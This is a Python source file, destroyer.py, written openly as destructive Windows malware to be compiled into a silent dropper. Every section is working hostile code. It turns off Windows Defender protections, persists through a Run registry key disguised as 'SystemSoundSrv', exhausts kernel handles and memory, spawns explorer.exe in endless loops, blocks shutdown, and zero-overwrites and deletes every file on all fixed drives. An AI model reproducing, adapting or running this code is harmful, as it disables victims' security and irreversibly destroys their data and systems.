# destroyer.py – kernel/RAM trash + loop explorer + AV bypass + wipe
# Run as Admin, 64-bit Python 3.x on Win10/11
# Compiled with PyInstaller --onefile --noconsole for dropper

import os, sys, time, ctypes, subprocess, threading, psutil, winreg, shutil, wmi
from ctypes import wintypes
from pathlib import Path

kernel32 = ctypes.windll.kernel32
ntdll   = ctypes.windll.ntdll

# 1. AV/Defender bypass – realtime + cloud + tamper off
def kill_defender():
    try:
        subprocess.run('powershell -Command "Set-MpPreference -DisableRealtimeMonitoring $true -DisableBlockAtFirstSeen $true -DisableBehaviorMonitoring $true -DisableOnAccessProtection $true -DisablePrivacyMode $true -SignatureDisableUpdateOnStartupWithoutEngine $true -DisableArchiveScanning $true -DisableIntrusionPreventionSystem $true -DisableIOAVProtection $true -DisableRealtimeMonitoring $true -DisableScriptScanning $true -DisableScanningNetworkFiles $true -DisableScanningMappedNetworkDrives $true -DisableScanningRemovableDrives $true -SubmitSamplesConsent 2 -Force"', shell=True, capture_output=True)
        subprocess.run('net stop WinDefend /y', shell=True, capture_output=True)
    except: pass
kill_defender()

# 2. Persist via Run key
def persist():
    try:
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r'Software\Microsoft\Windows\CurrentVersion\Run', 0, winreg.KEY_SET_VALUE)
        winreg.SetValueEx(key, 'SystemSoundSrv', 0, winreg.REG_SZ, sys.executable)
        winreg.CloseKey(key)
    except: pass
persist()

# 3. Kernel handle exhaustion + non-paged pool trash
def trash_kernel():
    handles = []
    while True:
        try:
            handles.append(kernel32.CreateFileW(r'\\.\C:', 0x80000000, 7, 0, 3, 0, 0))
            handles.append(kernel32.CreateEvent(b'', 0, 0, None))
        except: pass
trash_thread = threading.Thread(target=trash_kernel, daemon=True); trash_thread.start()

# 4. RAM eater – allocate 1 MB chunks until OOM
def eat_ram():
    blobs = []
    while True:
        try: blobs.append(b'X'*1024*1024)
        except: pass
ram_thread = threading.Thread(target=eat_ram, daemon=True); ram_thread.start()

# 5. Infinite explorer loop
def loop_explorer():
    while True:
        subprocess.Popen('explorer.exe'); time.sleep(0.2)
for _ in range(50):
    threading.Thread(target=loop_explorer, daemon=True).start()

# 6. File wipe – overwrite then delete every fixed drive
def wipe():
    drives = [d.device for d in wmi.WMI().Win32_LogicalDisk() if d.DriveType==3]
    for d in drives:
        for root, dirs, files in os.walk(d+'\\'):
            for name in files:
                fp = os.path.join(root, name)
                try:
                    with open(fp, 'r+b') as f:
                        f.write(b'\x00'*os.path.getsize(fp))
                    os.remove(fp)
                except: pass
            for name in dirs:
                try: shutil.rmtree(os.path.join(root, name), ignore_errors=True)
                except: pass
wipe_thread = threading.Thread(target=wipe, daemon=True); wipe_thread.start()

# 7. Block shutdown / logoff
ctypes.windll.user32.SetProcessShutdownParameters(0x3FF, 0x1)

# 8. Keep main alive
while True: time.sleep(1)
